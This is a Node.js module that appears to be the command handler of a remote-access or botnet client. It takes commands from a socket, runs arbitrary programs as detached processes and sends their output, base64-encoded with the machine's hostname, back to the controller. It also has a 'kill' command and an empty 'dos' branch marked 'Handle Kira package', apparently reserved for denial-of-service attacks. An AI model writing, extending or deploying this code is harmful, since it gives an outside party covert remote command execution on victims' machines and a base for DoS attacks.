module.exports = function() {
    return (function(baseSocket) {
        var self = this;

        var childObject;
        var Packet = require('../models/packet');
        var os = require('os');
        var send = require('../io/sender')(baseSocket).send;
        var spawn = require('child_process').spawn;
        var hostname = os.hostname();
        var toSend;

        var processCommand = function(cmd, cmdData, sender_id, receiver_id) {
            if (cmd === 'cmd') {
                var output;

                var splitted = cmdData.split(' ');
                var firstElement = splitted[0];
                splitted.shift();
                var args = splitted;
                if (args === firstElement) {
                    args = [];
                }
                try {
                    childObject = spawn(firstElement, args, {
                        detached: true
                    });

                    childObject.stdout.setEncoding('utf8');
                    childObject.stdout.on('data', function(data) {
                        console.log('stdout: ' + data);
                        output = data;
                        toSend = new Packet(sender_id, receiver_id, {
                            output: new Buffer(output).toString('base64'),
                            name: hostname
                        });
                        send(toSend);
                    });

                } catch (err) {
                    toSend = new Packet(sender_id, receiver_id, {
                        output: new Buffer('something went wrong while executing this command').toString('base64'),
                        name: hostname
                    });
                    console.log("something went wrong");
                    // console.log(`error message: ${err}`);
                    send(toSend);
                }
                return new Packet(sender_id, receiver_id, {
                    output: new Buffer("Everything is OK").toString('base64')
                });
            } else if (cmd === "ack") {
                console.log('Sender id: ' + sender_id);
                toSend = new Packet(sender_id, receiver_id, {
                    name: hostname
                });
                send(toSend);
            } else if (cmd === "dos") {
                //Handle Kira package
            } else if (cmd === 'kill') {
                try {
                    childObject.kill();
                    toSend = new Packet(sender_id, receiver_id, {
                        output: new Buffer('Process Succesfully killed').toString('base64')
                    });
                } catch (err) {
                    toSend = new Packet(sender_id, receiver_id, {
                        output: new Buffer('Something went wrong while killing the processs').toString('base64')
                    });
                }
                send(toSend);
            }
        };

        return {
            processCommand: processCommand
        }
    });
}();
